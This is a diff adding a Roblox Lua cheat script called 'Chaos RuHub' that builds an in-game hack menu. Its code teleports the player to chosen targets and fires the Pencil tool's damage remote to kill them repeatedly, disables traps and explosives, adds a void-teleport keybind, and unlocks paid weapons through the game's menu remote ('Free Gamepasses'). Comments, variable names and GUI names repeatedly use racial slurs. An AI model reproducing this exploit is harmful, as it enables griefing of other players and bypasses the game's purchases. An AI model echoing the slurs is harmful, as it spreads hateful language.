@@ -1,0 +1,2685 @@
+
+if _G.scriptrunning then
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "Error",
+        Text = "RuHub is already running!!! >:(",
+        Duration = 5
+    })
+    return  
+else
+
+    _G.scriptrunning = true
+end
+
+
+
+	
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local round = Instance.new("ImageLabel")
+local title = Instance.new("TextLabel")
+local border = Instance.new("Frame")
+local tab1 = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local tab2 = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local tab3 = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local tab4 = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local tab5 = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local gamingframe = Instance.new("Frame")
+local antie = Instance.new("TextButton")
+local antiv = Instance.new("TextButton")
+local antis = Instance.new("TextButton")
+local voidlabel = Instance.new("TextLabel")
+local voidbox = Instance.new("TextBox")
+local antif = Instance.new("TextButton")
+local freeg = Instance.new("TextButton")
+local Infinite = Instance.new("TextButton")
+local chattroll = Instance.new("TextButton")
+local cspy = Instance.new("TextButton")
+local lpframe = Instance.new("Frame")
+local wsr = Instance.new("TextBox")
+local fly = Instance.new("TextButton")
+local infjump = Instance.new("TextButton")
+local noclip = Instance.new("TextButton")
+local antiafk = Instance.new("TextButton")
+local infjump_2 = Instance.new("TextButton")
+local dashinf = Instance.new("TextButton")
+local closexd = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local killframe = Instance.new("Frame")
+local users = Instance.new("TextBox")
+local killon = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local aura = Instance.new("TextButton")
+local killborder = Instance.new("Frame")
+local settingsframe = Instance.new("Frame")
+local rjfr = Instance.new("TextButton")
+local dgui = Instance.new("TextButton")
+local shfr = Instance.new("TextButton")
+local creditsframe = Instance.new("Frame")
+local creds1 = Instance.new("TextLabel")
+local creds2 = Instance.new("TextButton")
+local creds3 = Instance.new("TextButton")
+local openxd = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local lp = Players.LocalPlayer
+
+shared.settings = {
+    killaura = false,
+    targets = {},
+}
+
+local targetNotified = {}
+local pencilskibidi = false
+
+local function getchar(plr, yield)
+    local plr = plr or lp
+    return plr.Character or yield and plr.CharacterAdded:Wait()
+end
+
+local function gethumanoid(plr, yield)
+    local char = getchar(plr, yield)
+    return yield and char:WaitForChild("Humanoid") or char:FindFirstChildWhichIsA("Humanoid")
+end
+
+local function getDamageRemote()
+    local char = getchar(nil, true)
+    local Tool = char:FindFirstChild("Pencil")
+    return Tool and Tool:FindFirstChild("DamageRemote")
+end
+
+local function fucktargets()
+    local targets = {}
+    for _, targetName in ipairs(shared.settings.targets) do
+        for _, v in ipairs(Players:GetPlayers()) do
+            if (v.Name:lower() == targetName:lower() or v.DisplayName:lower() == targetName:lower()) and v ~= lp then
+                local char = getchar(v)
+                if char and not char:FindFirstChildWhichIsA("ForceField") then
+                    local Humanoid = gethumanoid(v)
+                    if Humanoid and Humanoid.Health > 0 then
+                        table.insert(targets, v)
+                    end
+                end
+            end
+        end
+    end
+    return targets
+end
+
+local function sendNotification(title, text, duration)
+    StarterGui:SetCore("SendNotification", {
+        Title = title,
+        Text = text,
+        Duration = duration,
+    })
+end
+
+killon.MouseButton1Click:Connect(function()
+    shared.settings.killaura = not shared.settings.killaura
+    killon.Text = shared.settings.killaura and "Loopkill On" or "Loopkill Off"
+
+    if not shared.settings.killaura then
+        targetNotified = {}
+        pencilskibidi = false
+    end
+end)
+
+users.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        shared.settings.targets = {}
+        for targetName in users.Text:gmatch("[^,]+") do
+            table.insert(shared.settings.targets, targetName:match("^%s*(.-)%s*$"))
+        end
+    end
+end)
+
+clear.MouseButton1Click:Connect(function()
+    shared.settings.targets = {}
+    users.Text = ""
+end)
+
+local function onCharacterAdded()
+    while not lp.Character do
+        wait()
+    end
+    if shared.settings.killaura then
+        
+    end
+end
+
+lp.CharacterAdded:Connect(onCharacterAdded)
+
+local function onToolEquipped()
+    if shared.settings.killaura then
+        killon.Text = "Loopkill On"
+    else
+        killon.Text = "Loopkill Off"
+    end
+end
+
+lp.CharacterAdded:Connect(function()
+    local char = lp.Character or lp.CharacterAdded:Wait()
+    local tool = char:WaitForChild("Pencil", 5)
+    if tool then
+        tool.Equipped:Connect(onToolEquipped)
+    end
+end)
+
+shared.activeScript = RunService.Heartbeat:Connect(function()
+    if shared.settings.killaura then
+        local DamageRemote = getDamageRemote()
+        local targets = fucktargets()
+
+        local Tool = lp.Character and lp.Character:FindFirstChild("Pencil")
+        if not Tool and not pencilskibidi then
+            sendNotification("Tool is NOT equipped", "Please equip the Pencil for this script to work!", 5)
+            pencilskibidi = true
+            shared.settings.killaura = false
+            killon.Text = "Loopkill On"
+            return
+        elseif Tool then
+            pencilskibidi = false
+        end
+
+        if DamageRemote and #targets > 0 then
+            for _, target in ipairs(targets) do
+                local character = lp.Character
+                local targetChar = target.Character
+                if targetChar then
+                    if not targetNotified[target] then
+                        target.AncestryChanged:Connect(function(_, parent)
+                            if not parent and shared.settings.killaura then
+                                targetNotified[target] = true
+                            end
+                        end)
+                    end
+
+                    if character and character:FindFirstChild("HumanoidRootPart") and targetChar:FindFirstChild("HumanoidRootPart") then
+                        character.HumanoidRootPart.CFrame = targetChar.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
+                        DamageRemote:FireServer(gethumanoid(target))
+
+                        wait(1) 
+
+                        break
+                    end
+                end
+            end
+        end
+    end
+end)
+
+
+
+
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.674516916, 0, 0.186285719, 0)
+Frame.Size = UDim2.new(0, 451, 0, 286)
+Frame.Active = true
+Frame.Draggable = true
+
+-- drag nigger shit oh mee god
+
+local dragging = false
+local dragStartPos, startPos
+
+Frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStartPos = input.Position
+		startPos = Frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+
+round.Name = "round"
+round.Parent = Frame
+round.AnchorPoint = Vector2.new(0.5, 0.5)
+round.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+round.BackgroundTransparency = 1.000
+round.BorderColor3 = Color3.fromRGB(27, 42, 53)
+round.Position = UDim2.new(0.5, 0, 0.5, 0)
+round.Size = UDim2.new(1, 24, 1, 24)
+round.Image = "rbxassetid://3570695787"
+round.ImageColor3 = Color3.fromRGB(66, 66, 66)
+round.ScaleType = Enum.ScaleType.Slice
+round.SliceCenter = Rect.new(100, 100, 100, 100)
+round.SliceScale = 0.120
+
+title.Name = "title"
+title.Parent = round
+title.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+title.BorderSizePixel = 0
+title.Position = UDim2.new(0.0252631586, 0, 0.0375382751, 0)
+title.Size = UDim2.new(0, 451, 0, 50)
+title.Font = Enum.Font.Gotham
+title.Text = "Chaos RuHub"
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.TextScaled = true
+title.TextSize = 14.000
+title.TextWrapped = true
+
+border.Name = "border"
+border.Parent = round
+border.BackgroundColor3 = Color3.fromRGB(145, 145, 145)
+border.BorderColor3 = Color3.fromRGB(0, 0, 0)
+border.BorderSizePixel = 0
+border.Position = UDim2.new(0, 0, 0.203389823, 0)
+border.Size = UDim2.new(0, 475, 0, 1)
+
+tab1.Name = "tab1"
+tab1.Parent = Frame
+tab1.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+tab1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tab1.BorderSizePixel = 0
+tab1.Position = UDim2.new(-0.249280304, 0, 0.176367372, 0)
+tab1.Size = UDim2.new(0, 79, 0, 42)
+tab1.Font = Enum.Font.SourceSans
+tab1.Text = "☠"
+tab1.TextColor3 = Color3.fromRGB(0, 0, 0)
+tab1.TextSize = 33.000
+
+UICorner.Parent = tab1
+
+tab2.Name = "tab2"
+tab2.Parent = Frame
+tab2.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+tab2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tab2.BorderSizePixel = 0
+tab2.Position = UDim2.new(-0.249280304, 0, 0.357566237, 0)
+tab2.Size = UDim2.new(0, 79, 0, 42)
+tab2.Font = Enum.Font.SourceSans
+tab2.Text = "🧍‍♂️"
+tab2.TextColor3 = Color3.fromRGB(0, 0, 0)
+tab2.TextSize = 33.000
+
+UICorner_2.Parent = tab2
+
+tab3.Name = "tab3"
+tab3.Parent = Frame
+tab3.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+tab3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tab3.BorderSizePixel = 0
+tab3.Position = UDim2.new(-0.249280304, 0, 0.546145141, 0)
+tab3.Size = UDim2.new(0, 79, 0, 42)
+tab3.Font = Enum.Font.SourceSans
+tab3.Text = "🎮"
+tab3.TextColor3 = Color3.fromRGB(0, 0, 0)
+tab3.TextSize = 33.000
+
+UICorner_3.Parent = tab3
+
+tab4.Name = "tab4"
+tab4.Parent = Frame
+tab4.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+tab4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tab4.BorderSizePixel = 0
+tab4.Position = UDim2.new(-0.249280304, 0, 0.73725307, 0)
+tab4.Size = UDim2.new(0, 79, 0, 42)
+tab4.Font = Enum.Font.SourceSans
+tab4.Text = "⚙️"
+tab4.TextColor3 = Color3.fromRGB(0, 0, 0)
+tab4.TextSize = 33.000
+
+UICorner_4.Parent = tab4
+
+tab5.Name = "tab5"
+tab5.Parent = Frame
+tab5.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
+tab5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tab5.BorderSizePixel = 0
+tab5.Position = UDim2.new(-0.249280304, 0, 0.915148854, 0)
+tab5.Size = UDim2.new(0, 79, 0, 42)
+tab5.Font = Enum.Font.SourceSans
+tab5.Text = "🌐 "
+tab5.TextColor3 = Color3.fromRGB(0, 0, 0)
+tab5.TextSize = 33.000
+
+UICorner_5.Parent = tab5
+
+gamingframe.Name = "gamingframe"
+gamingframe.Parent = Frame
+gamingframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+gamingframe.BackgroundTransparency = 1.000
+gamingframe.BorderColor3 = Color3.fromRGB(0, 0, 0)
+gamingframe.BorderSizePixel = 0
+gamingframe.Position = UDim2.new(-0.0266075395, 0, 0.181083947, 0)
+gamingframe.Size = UDim2.new(0, 475, 0, 251)
+gamingframe.Visible = false
+
+antie.Name = "antie"
+antie.Parent = gamingframe
+antie.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+antie.BorderColor3 = Color3.fromRGB(145, 145, 145)
+antie.BorderSizePixel = 0
+antie.Position = UDim2.new(0.364210516, 0, 0.686900496, 0)
+antie.Size = UDim2.new(0, 129, 0, 50)
+antie.Font = Enum.Font.Gotham
+antie.Text = "Anti Explosives"
+antie.TextColor3 = Color3.fromRGB(0, 0, 0)
+antie.TextSize = 15.000
+antie.TextWrapped = true
+antie.MouseButton1Click:Connect(function()
+	local workspace = game:GetService("Workspace")
+	local c4ModelName = "C4 Model"
+	local grenadeModelName = "Grenade Model"
+	local function teleportModelChildren(modelName)
+		local model = workspace:FindFirstChild(modelName)
+		if model and model:IsA("Model") then
+			for _, child in ipairs(model:GetChildren()) do
+				if child:IsA("BasePart") then
+					child.Position = Vector3.new(-99, -50, 198)
+				end
+			end
+		end
+	end
+	while true do
+		teleportModelChildren(c4ModelName)
+		teleportModelChildren(grenadeModelName)
+		wait(0.1)
+	end
+
+end)
+
+antiv.Name = "antiv"
+antiv.Parent = gamingframe
+antiv.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+antiv.BorderColor3 = Color3.fromRGB(145, 145, 145)
+antiv.BorderSizePixel = 0
+antiv.Position = UDim2.new(0.0252631586, 0, 0.686900496, 0)
+antiv.Size = UDim2.new(0, 129, 0, 50)
+antiv.Font = Enum.Font.Gotham
+antiv.Text = "Anti Carry"
+antiv.TextColor3 = Color3.fromRGB(0, 0, 0)
+antiv.TextSize = 15.000
+antiv.TextWrapped = true
+antiv.MouseButton1Click:Connect(function()
+	local function skibidi()
+    
+
+		local player = game.Players.LocalPlayer
+		local character = player.Character or player.CharacterAdded:Wait()
+		local humanoid = character:WaitForChild("Humanoid")
+		
+		
+		local function check()
+			local b = character:FindFirstChild("Being Carried")
+			
+		
+			if b and b.Value == true then
+				humanoid.Health = 0
+			end
+		end
+		
+		
+		local b = character:WaitForChild("Being Carried")
+		b.Changed:Connect(function()
+			check()
+		end)
+		
+		
+		check()
+		end
+		
+		while true do
+			skibidi()
+			wait(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
+			end
+end)
+
+antis.Name = "antis"
+antis.Parent = gamingframe
+antis.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+antis.BorderColor3 = Color3.fromRGB(145, 145, 145)
+antis.BorderSizePixel = 0
+antis.Position = UDim2.new(0.703157902, 0, 0.686900496, 0)
+antis.Size = UDim2.new(0, 129, 0, 50)
+antis.Font = Enum.Font.Gotham
+antis.Text = "Anti Spike"
+antis.TextColor3 = Color3.fromRGB(0, 0, 0)
+antis.TextSize = 15.000
+antis.TextWrapped = true
+
+
+antis.MouseButton1Click:Connect(function()
+	local workspace = game:GetService("Workspace")
+	local spikeTrapModelName = "Spike Trap"
+
+	local function disableSpikeTraps()
+		for _, model in ipairs(workspace:GetChildren()) do
+			if model:IsA("Model") and model.Name == spikeTrapModelName then
+				local button = model:FindFirstChild("Button")
+				if button then
+					button.CanTouch = false
+				end
+			end
+		end
+	end
+
+	while true do
+		disableSpikeTraps()
+		wait(0.1) 
+	end
+end)
+
+
+
+voidlabel.Name = "voidlabel"
+voidlabel.Parent = gamingframe
+voidlabel.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+voidlabel.BorderColor3 = Color3.fromRGB(145, 145, 145)
+voidlabel.BorderSizePixel = 0
+voidlabel.Position = UDim2.new(0.0252631586, 0, 0.378486067, 0)
+voidlabel.Size = UDim2.new(0, 80, 0, 50)
+voidlabel.Font = Enum.Font.Gotham
+voidlabel.Text = "Void Keybind"
+voidlabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+voidlabel.TextSize = 16.000
+voidlabel.TextWrapped = true
+
+voidbox.Name = "voidbox"
+voidbox.Parent = gamingframe
+voidbox.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+voidbox.BorderColor3 = Color3.fromRGB(145, 145, 145)
+voidbox.BorderSizePixel = 0
+voidbox.Position = UDim2.new(0.202105269, 0, 0.378486067, 0)
+voidbox.Size = UDim2.new(0, 45, 0, 50)
+voidbox.Font = Enum.Font.SourceSans
+voidbox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+voidbox.PlaceholderText = "..."
+voidbox.Text = ""
+voidbox.TextColor3 = Color3.fromRGB(0, 0, 0)
+voidbox.TextScaled = true
+voidbox.TextSize = 14.000
+voidbox.TextWrapped = true
+
+--nigger void xd
+
+local userInputService = game:GetService("UserInputService")
+local player = game.Players.LocalPlayer
+local targetPosition = Vector3.new(-989889989898989, -989879898998988, -98999898989899898)
+
+local keybinder
+
+local function keyh(input)
+    if userInputService:GetFocusedTextBox() then
+        return
+    end
+
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if input.KeyCode.Name == voidbox.Text:upper() then
+            wait(0.1)
+
+            local bool = true
+
+            if bool then
+                game.Workspace.FallenPartsDestroyHeight = 0 / 0
+            else
+                game.Workspace.FallenPartsDestroyHeight = -500
+            end
+
+            if keybinder then
+                keybinder:Disconnect()
+            end
+
+            keybinder = userInputService.InputBegan:Connect(function(input, gameProcessed)
+                if input.KeyCode == Enum.KeyCode[voidbox.Text:upper()] and not gameProcessed then
+                    wait(0.3)
+                    player.Character.Humanoid.Health = 0
+
+                    local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                    if rootPart then
+                        rootPart.CFrame = CFrame.new(targetPosition)
+                    end
+                end
+            end)
+        end
+    end
+end
+
+voidbox:GetPropertyChangedSignal("Text"):Connect(function()
+    if string.len(voidbox.Text) > 1 then
+        voidbox.Text = voidbox.Text:sub(1, 1)
+    end
+    keyh({UserInputType = Enum.UserInputType.Keyboard, KeyCode = Enum.KeyCode[voidbox.Text:upper()]})
+end)
+
+userInputService.InputBegan:Connect(keyh)
+
+
+
+
+antif.Name = "antif"
+antif.Parent = gamingframe
+antif.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+antif.BorderColor3 = Color3.fromRGB(145, 145, 145)
+antif.BorderSizePixel = 0
+antif.Position = UDim2.new(0.703157902, 0, 0.368175358, 0)
+antif.Size = UDim2.new(0, 129, 0, 50)
+antif.Font = Enum.Font.Gotham
+antif.Text = "Anti Fling"
+antif.TextColor3 = Color3.fromRGB(0, 0, 0)
+antif.TextSize = 15.000
+antif.TextWrapped = true
+antif.MouseButton1Click:Connect(function()
+	-- // Constants \\ --
+	-- [ Services ] --
+	local Services = setmetatable({}, {__index = function(Self, Index)
+		local NewService = game.GetService(game, Index)
+		if NewService then
+			Self[Index] = NewService
+		end
+		return NewService
+	end})
+
+	-- [ LocalPlayer ] --
+	local LocalPlayer = Services.Players.LocalPlayer
+
+	-- // Functions \\ --
+	local function PlayerAdded(Player)
+		local Detected = false
+		local Character
+		local PrimaryPart
+
+		local function CharacterAdded(NewCharacter)
+			Character = NewCharacter
+			repeat
+				wait()
+				PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
+			until PrimaryPart
+			Detected = false
+		end
+
+		CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
+		Player.CharacterAdded:Connect(CharacterAdded)
+
+		Services.RunService.Heartbeat:Connect(function()
+			if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
+				if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
+					if not Detected then
+						Detected = true
+					end
+					for _, v in ipairs(Character:GetDescendants()) do
+						if v:IsA("BasePart") then
+							v.CanCollide = false
+							v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+							v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+							v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+						end
+					end
+					PrimaryPart.CanCollide = false
+					PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+					PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+					PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
+				end
+			end
+		end)
+	end
+
+	-- // Event Listeners \\ --
+	for _, v in ipairs(Services.Players:GetPlayers()) do
+		if v ~= LocalPlayer then
+			PlayerAdded(v)
+		end
+	end
+	Services.Players.PlayerAdded:Connect(PlayerAdded)
+
+	local LastPosition = nil
+	Services.RunService.Heartbeat:Connect(function()
+		pcall(function()
+			local PrimaryPart = LocalPlayer.Character.PrimaryPart
+			if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
+				PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+				PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+				PrimaryPart.CFrame = LastPosition
+			elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
+				LastPosition = PrimaryPart.CFrame
+			end
+		end)
+	end)
+end)
+
+freeg.Name = "freeg"
+freeg.Parent = gamingframe
+freeg.BackgroundColor3 = Color3.fromRGB(121, 121, 121)
+freeg.BorderColor3 = Color3.fromRGB(145, 145, 145)
+freeg.BorderSizePixel = 0
+freeg.Position = UDim2.new(0.364210516, 0, 0.380127549, 0)
+freeg.Size = UDim2.new(0, 129, 0, 50)
+freeg.Font = Enum.Font.Gotham
+freeg.Text = "Free Gamepasses"
+freeg.TextColor3 = Color3.fromRGB(0, 0, 0)
+freeg.TextSize = 15.000
+freeg.TextWrapped = true
+freeg.MouseButton1Down:Connect(function()
+	local player = game.Players.LocalPlayer
+
+local function nigga2()
+    local screenGui = player:WaitForChild("PlayerGui"):WaitForChild("Menu Screen")
+
+    local function hideChildren()
+        for _, child in pairs(screenGui:GetChildren()) do
+            if child:IsA("GuiObject") then
+                child.Visible = false
+            end
+        end
+    end
+
+    while true do
+        hideChildren()
+        wait(0.1)
+    end
+end
+
+local function nigga1()
+   -- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local niggermenu = Instance.new("ScreenGui")
+local niggamenuframe = Instance.new("TextButton")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local Mace = Instance.new("ImageButton")
+local UICorner = Instance.new("UICorner")
+local IconShadow = Instance.new("ImageLabel")
+local Icon = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local Chainsaw = Instance.new("ImageButton")
+local UICorner_2 = Instance.new("UICorner")
+local IconShadow_2 = Instance.new("ImageLabel")
+local Icon_2 = Instance.new("ImageLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local HolloweenDagger = Instance.new("ImageButton")
+local TextLabel_3 = Instance.new("TextLabel")
+local Icon_3 = Instance.new("ImageLabel")
+local IconShadow_3 = Instance.new("ImageLabel")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel_4 = Instance.new("TextLabel")
+local UIGradient = Instance.new("UIGradient")
+local Frame = Instance.new("Frame")
+local UIGradient_2 = Instance.new("UIGradient")
+local UICorner_4 = Instance.new("UICorner")
+local PinkHammer = Instance.new("ImageButton")
+local TextLabel_5 = Instance.new("TextLabel")
+local UICorner_5 = Instance.new("UICorner")
+local SteelSword = Instance.new("ImageButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local UICorner_6 = Instance.new("UICorner")
+local Katana = Instance.new("ImageButton")
+local TextLabel_7 = Instance.new("TextLabel")
+local UICorner_7 = Instance.new("UICorner")
+local FrostSpear = Instance.new("ImageButton")
+local ViewportFrame = Instance.new("ViewportFrame")
+local TextLabel_8 = Instance.new("TextLabel")
+local UICorner_8 = Instance.new("UICorner")
+local BloodDagger = Instance.new("ImageButton")
+local TextLabel_9 = Instance.new("TextLabel")
+local Icon_4 = Instance.new("ImageLabel")
+local IconShadow_4 = Instance.new("ImageLabel")
+local UICorner_9 = Instance.new("UICorner")
+local EmeraldGreatsword = Instance.new("ImageButton")
+local TextLabel_10 = Instance.new("TextLabel")
+local Icon_5 = Instance.new("ImageLabel")
+local IconShadow_5 = Instance.new("ImageLabel")
+local UICorner_10 = Instance.new("UICorner")
+local Scythe = Instance.new("ImageButton")
+local TextLabel_11 = Instance.new("TextLabel")
+local Icon_6 = Instance.new("ImageLabel")
+local IconShadow_6 = Instance.new("ImageLabel")
+local UICorner_11 = Instance.new("UICorner")
+local UIPadding = Instance.new("UIPadding")
+local UIGridLayout = Instance.new("UIGridLayout")
+local BaseballBat = Instance.new("ImageButton")
+local TextLabel_12 = Instance.new("TextLabel")
+local Icon_7 = Instance.new("ImageLabel")
+local IconShadow_7 = Instance.new("ImageLabel")
+local UICorner_12 = Instance.new("UICorner")
+local Pencil = Instance.new("ImageButton")
+local TextLabel_13 = Instance.new("TextLabel")
+local Icon_8 = Instance.new("ImageLabel")
+local IconShadow_8 = Instance.new("ImageLabel")
+local UICorner_13 = Instance.new("UICorner")
+local Pan = Instance.new("ImageButton")
+local TextLabel_14 = Instance.new("TextLabel")
+local Icon_9 = Instance.new("ImageLabel")
+local IconShadow_9 = Instance.new("ImageLabel")
+local UICorner_14 = Instance.new("UICorner")
+local Knife = Instance.new("ImageButton")
+local TextLabel_15 = Instance.new("TextLabel")
+local Icon_10 = Instance.new("ImageLabel")
+local IconShadow_10 = Instance.new("ImageLabel")
+local UICorner_15 = Instance.new("UICorner")
+local TextLabel_16 = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+
+--Properties:
+
+niggermenu.Name = "nigger menu"
+niggermenu.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+niggermenu.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+niggamenuframe.Name = "niggamenuframe"
+niggamenuframe.Parent = niggermenu
+niggamenuframe.AnchorPoint = Vector2.new(0.5, 0.5)
+niggamenuframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+niggamenuframe.BackgroundTransparency = 1.000
+niggamenuframe.BorderColor3 = Color3.fromRGB(27, 42, 53)
+niggamenuframe.Position = UDim2.new(0.5, 0, 0.600000024, 0)
+niggamenuframe.Size = UDim2.new(0.330000013, 0, 0.25, 0)
+niggamenuframe.SizeConstraint = Enum.SizeConstraint.RelativeXX
+niggamenuframe.Modal = true
+niggamenuframe.Font = Enum.Font.SourceSans
+niggamenuframe.Text = ""
+niggamenuframe.TextColor3 = Color3.fromRGB(0, 0, 0)
+niggamenuframe.TextSize = 14.000
+
+ScrollingFrame.Parent = niggamenuframe
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.BackgroundTransparency = 1.000
+ScrollingFrame.BorderColor3 = Color3.fromRGB(27, 42, 53)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.Size = UDim2.new(1, 0, 1, 0)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 5, 0)
+ScrollingFrame.ScrollBarThickness = 2
+
+Mace.Name = "Mace"
+Mace.Parent = ScrollingFrame
+Mace.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Mace.BackgroundTransparency = 0.700
+Mace.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Mace.Size = UDim2.new(0, 100, 0, 100)
+Mace.Image = "http://www.roblox.com/asset/?id=6507106235"
+Mace.MouseButton1Down:Connect(function()
+	local args = { [1] = "Mace" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+UICorner.CornerRadius = UDim.new(0, 4)
+UICorner.Parent = Mace
+
+IconShadow.Name = "Icon Shadow"
+IconShadow.Parent = Mace
+IconShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow.BackgroundTransparency = 1.000
+IconShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
+IconShadow.Position = UDim2.new(0, 2, 0, 2)
+IconShadow.Size = UDim2.new(0, 100, 0, 100)
+IconShadow.Image = "http://www.roblox.com/asset/?id=6507106235"
+IconShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+IconShadow.ImageTransparency = 0.500
+
+Icon.Name = "Icon"
+Icon.Parent = Mace
+Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Icon.BackgroundTransparency = 1.000
+Icon.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Icon.Size = UDim2.new(0, 100, 0, 100)
+Icon.Image = "http://www.roblox.com/asset/?id=6507106235"
+
+TextLabel.Parent = Mace
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
+TextLabel.Position = UDim2.new(0, 0, 1, 0)
+TextLabel.Size = UDim2.new(1, 0, 0, 20)
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Mace"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 17.000
+
+Chainsaw.Name = "Chainsaw"
+Chainsaw.Parent = ScrollingFrame
+Chainsaw.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
+Chainsaw.BackgroundTransparency = 0.700
+Chainsaw.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Chainsaw.Size = UDim2.new(0, 100, 0, 100)
+Chainsaw.Image = "http://www.roblox.com/asset/?id=6507111195"
+Chainsaw.MouseButton1Down:Connect(function()
+	local args = { [1] = "Chainsaw" }
+	game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("Menu Screen").RemoteEvent:FireServer(unpack(args))
+	game:GetService("Players").LocalPlayer.PlayerGui["Menu Screen"]:Remove()
+
+	wait(0.01)
+	niggamenuframe.Visible = false
+end)
+
+UICorner_2.CornerRadius = UDim.new(0, 4)
+UICorner_2.Parent = Chainsaw
+
+IconShadow_2.Name = "Icon Shadow"
+IconShadow_2.Parent = Chainsaw
+IconShadow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+IconShadow_2.BackgroundTransparency = 1.000
+IconShadow_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
